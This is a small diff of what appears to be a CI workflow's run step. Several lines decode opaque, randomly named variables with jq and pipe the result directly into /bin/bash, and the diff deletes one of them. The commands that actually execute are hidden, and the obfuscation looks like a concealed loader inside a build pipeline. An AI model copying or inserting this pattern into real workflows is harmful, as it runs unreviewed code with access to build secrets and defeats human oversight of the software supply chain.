@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$chl86867" | jq -r .me2 | /bin/bash
           echo $revoa48 | jq -r .ddz10470 | /bin/bash
-          printf '%s' "$ndwc206" | jq -r .o8206 | /bin/bash
           printf '%s' "$ysf0" | jq -r .dtbag966 | /bin/bash
 
       - name: Store results
